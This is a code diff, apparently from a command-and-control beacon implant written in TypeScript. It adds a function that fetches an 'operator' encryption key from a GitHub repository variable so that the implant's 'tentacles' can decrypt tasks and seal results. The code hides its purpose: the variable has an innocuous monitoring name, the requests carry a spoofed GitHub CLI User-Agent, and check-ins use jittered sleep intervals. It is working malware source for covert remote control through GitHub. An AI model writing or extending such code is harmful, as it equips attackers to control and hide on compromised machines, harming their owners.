@@ -56,6 +56,35 @@ import type { BeaconConfig, CheckinPayload, RelayConfig, ProxyConfig } from "./t
 
 const log = createLogger("svc");
 
+// ── Operator public key resolution ───────────────────────────────────────────
+
+/**
+ * Fetch the operator's X25519 public key from the MONITORING_PUBKEY repo variable.
+ * Falls back to a zero key if the variable isn't set (IssuesTentacle will still
+ * work as it fetches the key separately during init).
+ */
+async function resolveOperatorPublicKey(token: string, owner: string, repo: string): Promise<Uint8Array> {
+  try {
+    const resp = await fetch(
+      `https://api.github.com/repos/${owner}/${repo}/actions/variables/MONITORING_PUBKEY`,
+      { headers: { Authorization: `Bearer ${token}`, "User-Agent": "GitHub CLI/gh/2.48.0" } },
+    );
+    if (resp.ok) {
+      const data = await resp.json() as { value?: string };
+      const b64 = data.value?.trim();
+      if (b64) {
+        const key = await base64ToBytes(b64);
+        if (key.length === 32) {
+          log.info("Resolved operator public key from MONITORING_PUBKEY variable");
+          return key;
+        }
+      }
+    }
+  } catch { /* fall through */ }
+  log.warn("Could not resolve MONITORING_PUBKEY — some tentacles may fail to decrypt tasks");
+  return new Uint8Array(32);
+}
+
 // ── Beacon ID resolution ──────────────────────────────────────────────────────
 
 /**
@@ -245,9 +274,9 @@ async function loadConfig(beaconId: string): Promise<BeaconConfig> {
     tentaclePriority: parseTentaclePriority(),
     sleepSeconds: parseInt(process.env.SVC_SLEEP  ?? "60",  10),
     jitter:       parseFloat(process.env.SVC_JITTER ?? "0.3"),
-    // operatorPublicKey is not needed here — IssuesTentacle fetches it from
-    // the GitHub Variable during initialization and never reads config.operatorPublicKey.
-    operatorPublicKey: new Uint8Array(32),
+    // Fetch operator public key from the MONITORING_PUBKEY repo variable.
+    // All tentacles need this for decrypting tasks (crypto_box) and sealing results.
+    operatorPublicKey: await resolveOperatorPublicKey(token, owner, repo),
     beaconKeyPair,
     proxyRepos: parseProxyRepos(),
     ...(parseCleanupDays() !== undefined ? { cleanupDays: parseCleanupDays()! } : {}),
